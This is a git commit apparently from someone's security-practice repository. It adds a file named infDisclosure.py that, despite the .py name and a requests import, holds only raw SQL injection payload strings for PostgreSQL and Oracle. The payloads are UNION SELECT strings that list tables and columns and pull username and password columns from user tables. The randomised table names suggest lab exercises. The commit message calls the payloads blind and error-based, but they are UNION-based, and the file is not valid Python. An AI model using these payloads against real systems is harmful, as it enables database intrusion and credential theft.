f0356b079e75ca5c17c7382e5ee2bec75b63235a
ricchi24 <ricchisulis24@gmail.com>
2023-08-08 18:13:05 +0100

    blind sqli error based

---
+++ SQLI/infDisclosure.py
@@ -0,0 +1,22 @@
+import requests
+
+# postgress
+"UNION SELECT NULL, table_name FROM information_schema.tables -- -"
+
+'UNION+SELECT+column_name,+NULL+from+information_schema.columns+where+table_name='users_ltotmd'--+-
+
+'UNION+SELECT+table_name,+NULL+from+information_schema.tables+--+-
+
+'UNION+SELECT+password_ktjigj,username_vuklth+from+users_ltotmd--+-
+
+
+# oracle
+
+#retrieve table
+'+UNION+SELECT+TABLE_NAME,NULL+from+ALL_TABLES+--+-
+
+#retrive column
+'+UNION+SELECT+COLUMN_NAME,NULL+from+ALL_TAB_COLUMNS+WHERE+TABLE_NAME='USERS_CRSADS'+--+-
+
+#retrieve username and password
+'+UNION+SELECT+USERNAME_JZEKRA,PASSWORD_ETHDSR+from+USERS_CRSADS+--+-
